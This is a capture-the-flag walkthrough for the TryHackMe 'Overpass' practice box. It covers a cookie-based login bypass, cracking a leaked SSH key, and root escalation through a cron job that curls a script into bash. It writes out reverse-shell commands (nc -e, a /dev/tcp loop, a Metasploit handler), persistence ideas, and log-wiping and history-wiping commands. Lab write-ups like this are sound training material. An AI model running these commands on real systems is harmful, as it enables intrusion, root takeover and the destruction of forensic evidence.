---
title: "THM:overpass"
subtitle: "TryHackMe CTF room: https://tryhackme.com/room/overpass"
category: "CTF"
tags: ctf,nmap,gobuster,dirbuster,session,broken-authentication,javascript,apache,ubuntu,john,ssh2john,linpeas,privesc,cron
---
# THM:overpass

URL: [https://tryhackme.com/room/overpass](https://tryhackme.com/room/overpass) [Easy]

Tags: 
<div style="margin-left: 5px;">
{% assign tags = page.tags | split: "," %}
{% for tag in tags %}
<a href="../search/?q={{tag}}" title="Click to search by this tag"><span class="badge bg-secondary">{{tag}}</span></a>
{% endfor %}
</div>
<hr>

## Reconnaissance

Description of the room:

> What happens when some broke CompSci students make a password manager?
>  
> What happens when a group of broke Computer Science students try to make a password manager?
Obviously a perfect commercial success!
>  
> There is a TryHackMe subscription code hidden on this box. The first person to find and activate it will get a one month subscription for free! If you're already a subscriber, why not give the code to a friend?
> 
> *UPDATE: The code is now claimed.
The machine was slightly modified on 2020/09/25. This was only to improve the performance of the machine. It does not affect the process.*

## Scanning

### Running: `nmap`

Ran the following:

> `nmap -sC -sV xxx.xxx.xxx.xxx`

Interesting ports found to be open:

```python
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack
```

Also see: [nmap.log](nmap.log)

### Running: `gobuster`

Ran the following:

> `gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://xxx.xxx.xxx.xxx`

Interesting folders found:

```python
/img                  (Status: 301) [Size: 0] [--> img/]
/downloads            (Status: 301) [Size: 0] [--> downloads/]
/aboutus              (Status: 301) [Size: 0] [--> aboutus/]  
/admin                (Status: 301) [Size: 42] [--> /admin/]  
/css                  (Status: 301) [Size: 0] [--> css/] 
```

Also see: [gobuster.log](gobuster.log)

## Gaining Access

Started by looking at `/admin/` page to see if there was anything exploitable.

### Unprivileged Access

Javascript on the `/admin/` page has a simple check (note the `else` clause):

```javascript
async function login() {
    const usernameBox = document.querySelector("#username");
    const passwordBox = document.querySelector("#password");
    const loginStatus = document.querySelector("#loginStatus");
    loginStatus.textContent = ""
    const creds = { username: usernameBox.value, password: passwordBox.value }
    const response = await postData("/api/login", creds)
    const statusOrCookie = await response.text()
    if (statusOrCookie === "Incorrect credentials") {
        loginStatus.textContent = "Incorrect Credentials"
        passwordBox.value=""
    } else {
        Cookies.set("SessionToken",statusOrCookie)
        window.location = "/admin"
    }
}
```

Basically, if the `SessionToken` cookie is set, that is all you need to be "logged in". This is the [OWASP definition of Broken Authentication](https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication).

To get around this, we go into Developer Tools (<kbd>F12</kbd>) to execute:

```javascript
Cookies.set("SessionToken", "")
```

Then, refresh the page. You will be logged in and will see an exposed SSH private key. Capture that (to `./james_id_rsa`). We need to run:

> `ssh2john.py ./james_id_rsa > ./james_id_rsa.hash`

to get this private key into a format that John the Ripper can crack. Finally, we can run the following to get the password for the SSH private key:

> `john ./id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt`

This [shows us](john.log) the password is: `james13`. We can now SSH into this server with:

> `ssh james@xxx.xxx.xxx.xxx -i ./james_id_rsa`

From that, we can retrieve the `user.txt` flag.

### Privilege Escalation

Linpeas showed that we had write-permissions on `/etc/hosts`. Meanwhile, `/etc/crontab` has an entry like this:

```bash
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
# Update builds from latest code
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```
Also see: [linpeas.log](linpeas.log)

#### The Killchain

This is a multi-step operation where we need to stand up a web server to offer our payload to the target machine, who we want to trick into download that payload. The idea is to:

1. Target: Modify `/etc/hosts` to point back to our workstation for `overpass.thm`.
1. Attacker: Stand up a webserver that hosts `/downloads/src/buildscript.sh`.
1. Attacker: Develop a payload that will spawn a reverse shell, and put it into that `buildscript.sh`.
1. Attacker: Create a listener to catch the session (e.g. `nc` or Metasploit).

Then, in the next minute:

1. The cronjob will kick off, reach out to OUR server for `buildscript.sh`.
1. `buildscript.sh` executes, running as `root`, and connects back to our listener.
1. We now have a reverse shell running as `root`. We can now retrieve the `/root/root.txt` flag.

For more of the details, see below.

#### Reverse Shell: ATTACKER

Use Netcat:

> `nc -l -p 9999 -vvv`

OR use Metasploit:

> `sudo msfdb init && msfconsole`

And set the Options, thusly (replacing `10.2.11.212` with your workstation IP address):

```metasploit
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 10.2.110.212
set LPORT 9999

exploit
```

#### Reverse Shell: TARGET

On the target machine (by-hand for testing, and then ultimately via `buildscript.sh`), connect to the listener on our attacker box with Netcat:

> `nc yyy.yyy.yyy.yyy 9999 -e /bin/bash`

However, since there are variations of `nc` and some don't allow the `-e` argument - if you get an error about that, you could use some Linux trickery with this statement:

> `exec 5<>/dev/tcp/yyy.yyy.yyy.yyy/9999 && cat <&5 | while read line; do $line 2>&5 >&5; done`

**NOTE:** Make sure to set `yyy.yyy.yyy.yyy` to the attacker IP address and `9999` to the attacker port.

[Source: https://incognitjoe.github.io/reverse-shells-for-dummies.html]

Also see: [buildscript.sh](downloads/src/buildscript.sh)


## Maintaining Access

This is a test machine. However, in a Red Team scenario, we could:

* Add SSH key to `/root/.ssh/authorized_keys`
* Create a privileged account that wouldn't draw attention (ex: `operations`).
* Install some other backdoor or service.

## Clearing Tracks

This is a test machine. However, in a Red Team scenario, we could:

### Delete relevant logs from `/var/log/` - although that might draw attention.

> `rm -Rf /var/log/*`

### Search and replace our IP address in all logs via: 

> `find /var/log -name "*" -exec sed -i 's/10.10.2.14/127.0.0.1/g' {}\;`

### Wipe bash history for any accounts we used via: 

> `cat /dev/null > /root/.bash_history`
>  
> `cat /dev/null > /home/kathy/.bash_history`
>  
> `cat /dev/null > /home/sam/.bash_history`

## Summary

Completed: [`2022-01-20 20:08:10`]